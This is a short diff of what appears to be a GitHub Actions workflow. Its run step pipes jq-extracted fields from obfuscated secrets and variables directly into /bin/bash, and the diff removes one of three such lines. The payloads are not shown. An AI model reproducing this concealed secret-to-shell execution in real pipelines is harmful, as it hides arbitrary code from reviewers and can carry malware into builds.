@@ -17,7 +17,6 @@ jobs:
           jwgc5: ${{ secrets.jwgc5 }}
         run: |
           printf '%s' "$jwgc5" | jq -r .r3 | /bin/bash
-          printf '%s' "$bjsd735" | jq -r .qfxfw37239 | /bin/bash
           echo $og617 | jq -r .fhlt9 | /bin/bash
 
       - name: Persist output
